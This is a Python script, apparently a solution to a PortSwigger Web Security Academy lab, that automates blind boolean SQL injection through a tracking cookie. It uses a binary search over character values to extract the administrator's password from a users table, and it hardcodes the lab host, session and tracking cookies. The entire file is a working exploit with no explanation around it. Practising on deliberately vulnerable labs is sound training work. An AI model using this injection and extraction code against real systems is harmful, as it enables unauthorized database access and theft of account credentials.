import requests


def parserHeader(txt_header):
    headers = {}
    for line in txt_header.splitlines():
        arr = line.split(":")
        name = arr[0].strip()
        value = arr[1].strip()
        headers[name] = value  
    return headers  


def sqli(url, headers, pos=None, mid=None):
    flag = False

    headers['Cookie']="TrackingId=gZt2Qc6ltC8vyDHZ' AND (SELECT SUBSTRING(password,"+ str(pos) + ",1) FROM users WHERE username='administrator')>'"+ chr(mid) +"; session=doACavZ1FtHmoyP0bbwgbBDkkCbYCgnp'"
    print("Payload: " + headers['Cookie'])
    ret=requests.get(url=url, headers=headers)

    if 'Welcome back!' in ret.text:
        flag = True
    return flag



def get_char(pos):
    lo, hi = 32, 128 # the ASCII values for printables
    while lo <= hi: #calculating the first mid
        mid = lo + (hi - lo) // 2 # the formula i've explanied before

        if sqli(url, headers, pos, mid): 
            print("Index: ", mid)
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

if __name__ == "__main__":
    txt_header='''Host: 0a9f003e033f12f5c01b4d1a00c60090.web-security-academy.net
Cookie: TrackingId=gZt2Qc6ltC8vyDHZ; session=doACavZ1FtHmoyP0bbwgbBDkkCbYCgnp
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,vi;q=0.8
Connection: close'''

    headers = parserHeader(txt_header)
    #print(headers)
    url="https://0a8f00870476a66cc01a04a600480095.web-security-academy.net/filter?category=Gifts"
    
    password=""
    for i in range(1,21):
        ret=get_char(i)
        password += ret
    print("PASSWORD: ", password)